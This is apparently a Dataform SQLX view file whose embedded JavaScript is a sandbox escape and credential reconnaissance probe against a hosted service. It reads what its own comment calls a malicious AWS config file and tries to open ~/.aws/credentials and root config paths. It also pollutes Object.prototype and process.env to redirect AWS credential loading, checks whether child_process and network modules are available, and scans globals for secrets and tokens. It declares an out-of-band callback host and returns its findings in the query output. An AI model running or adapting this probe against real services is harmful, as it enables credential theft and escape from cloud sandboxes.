-- AWS Environment Probe Test
-- Tests for AWS SDK presence, config paths, credential_process potential

config {
  type: "view",
  name: "aws_env_test"
}

js {
  let results = [];
  const oastEndpoint = "juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun";

  // Test 1: Try to read our malicious AWS config file
  try {
    const awsConfig = restricted_fs.readFile("aws_config");
    results.push("1_aws_config_file: " + awsConfig.substring(0, 200));
  } catch(e) {
    results.push("1_aws_config_file: " + e.message);
  }

  // Test 2: Check home directory paths
  try {
    const homePaths = [
      "~/.aws/config",
      "~/.aws/credentials",
      "$HOME/.aws/config",
      "../.aws/config",
      "../../.aws/config",
      "/root/.aws/config",
      "/home/user/.aws/config"
    ];
    const pathResults = [];
    for (const p of homePaths) {
      try {
        const content = restricted_fs.readFile(p);
        pathResults.push(p + ":SUCCESS");
      } catch(e) {
        pathResults.push(p + ":" + e.message.substring(0, 20));
      }
    }
    results.push("2_home_paths: " + pathResults.join(" | "));
  } catch(e) {
    results.push("2_home_paths: ERROR");
  }

  // Test 3: Check if AWS_CONFIG_FILE env var affects anything
  try {
    // Try setting it via prototype pollution
    Object.prototype.AWS_CONFIG_FILE = "./aws_config";
    Object.prototype.AWS_SHARED_CREDENTIALS_FILE = "./aws_config";

    // Now try to trigger credential loading
    try {
      const aws = require('aws-sdk');
      results.push("3_aws_after_pollution: loaded");
    } catch(e) {
      results.push("3_aws_after_pollution: " + e.message.substring(0, 50));
    }

    delete Object.prototype.AWS_CONFIG_FILE;
    delete Object.prototype.AWS_SHARED_CREDENTIALS_FILE;
  } catch(e) {
    results.push("3_env_pollution: ERROR - " + e.message);
  }

  // Test 4: Check for node-config or similar config loading
  try {
    const configFiles = ["config.json", "config.js", ".env", "settings.json"];
    const found = [];
    for (const f of configFiles) {
      if (restricted_fs.exists(f)) {
        found.push(f);
      }
    }
    results.push("4_config_files: " + (found.length ? found.join(",") : "none"));
  } catch(e) {
    results.push("4_config_files: ERROR");
  }

  // Test 5: Try to pollute process.env with AWS vars
  try {
    if (typeof process !== 'undefined' && process.env) {
      process.env.AWS_CONFIG_FILE = "./aws_config";
      process.env.AWS_SDK_LOAD_CONFIG = "1";
      results.push("5_process_env_set: SUCCESS");
    } else {
      // Try to create process
      globalThis.process = {
        env: {
          AWS_CONFIG_FILE: "./aws_config",
          AWS_SDK_LOAD_CONFIG: "1"
        }
      };
      results.push("5_process_created: " + JSON.stringify(globalThis.process.env));
    }
  } catch(e) {
    results.push("5_process_env: " + e.message);
  }

  // Test 6: Check what modules are available
  try {
    const moduleTests = [
      'fs', 'path', 'http', 'https', 'net', 'child_process', 'os',
      'crypto', 'util', 'events', 'stream', 'buffer'
    ];
    const available = [];
    for (const m of moduleTests) {
      try {
        require(m);
        available.push(m);
      } catch(e) {
        // not available
      }
    }
    results.push("6_available_modules: " + (available.length ? available.join(",") : "none"));
  } catch(e) {
    results.push("6_modules: ERROR");
  }

  // Test 7: Check globalThis for interesting objects
  try {
    const interestingKeys = [];
    for (const key of Object.keys(globalThis)) {
      const lower = key.toLowerCase();
      if (lower.includes('aws') || lower.includes('credential') ||
          lower.includes('secret') || lower.includes('token') ||
          lower.includes('auth') || lower.includes('config')) {
        interestingKeys.push(key);
      }
    }
    results.push("7_interesting_globals: " + (interestingKeys.length ? interestingKeys.join(",") : "none"));
  } catch(e) {
    results.push("7_globals: ERROR");
  }

  // Test 8: Try to use fetch or XMLHttpRequest
  try {
    if (typeof fetch !== 'undefined') {
      results.push("8_fetch: AVAILABLE");
    } else if (typeof XMLHttpRequest !== 'undefined') {
      results.push("8_xhr: AVAILABLE");
    } else {
      results.push("8_http_client: NOT_AVAILABLE");
    }
  } catch(e) {
    results.push("8_http: ERROR");
  }

  // Test 9: Check for Buffer class
  try {
    if (typeof Buffer !== 'undefined') {
      const testBuf = Buffer.from("test");
      results.push("9_buffer: AVAILABLE");
    } else {
      results.push("9_buffer: NOT_AVAILABLE");
    }
  } catch(e) {
    results.push("9_buffer: " + e.message);
  }

  // Test 10: Try to access __dirname, __filename
  try {
    const pathInfo = [];
    if (typeof __dirname !== 'undefined') pathInfo.push("__dirname=" + __dirname);
    if (typeof __filename !== 'undefined') pathInfo.push("__filename=" + __filename);
    if (typeof module !== 'undefined') pathInfo.push("module.id=" + module.id);
    results.push("10_paths: " + (pathInfo.length ? pathInfo.join(",") : "none"));
  } catch(e) {
    results.push("10_paths: " + e.message);
  }

  // Test 11: Check require.resolve
  try {
    if (typeof require.resolve !== 'undefined') {
      try {
        const awsPath = require.resolve('aws-sdk');
        results.push("11_aws_path: " + awsPath);
      } catch(e) {
        results.push("11_aws_path: " + e.message.substring(0, 50));
      }
    } else {
      results.push("11_resolve: NOT_AVAILABLE");
    }
  } catch(e) {
    results.push("11_resolve: ERROR");
  }

  // Test 12: Try node:* imports (Node.js builtin modules)
  try {
    const nodeModules = ['node:fs', 'node:path', 'node:child_process'];
    const nodeResults = [];
    for (const m of nodeModules) {
      try {
        require(m);
        nodeResults.push(m + ":OK");
      } catch(e) {
        nodeResults.push(m + ":FAIL");
      }
    }
    results.push("12_node_builtins: " + nodeResults.join(","));
  } catch(e) {
    results.push("12_node: ERROR");
  }

  // Test 13: Enumerate all files in current directory
  try {
    // Use restricted_fs to list what's available
    const dirs = [".", "definitions", "includes", "node_modules"];
    const fileList = [];
    for (const d of dirs) {
      try {
        if (restricted_fs.isDirectory(d)) {
          fileList.push(d + ":DIR");
        }
      } catch(e) {
        fileList.push(d + ":ERR");
      }
    }
    results.push("13_dirs: " + fileList.join(","));
  } catch(e) {
    results.push("13_dirs: ERROR");
  }
}

SELECT
  '${JSON.stringify(results)}' as aws_probe_results
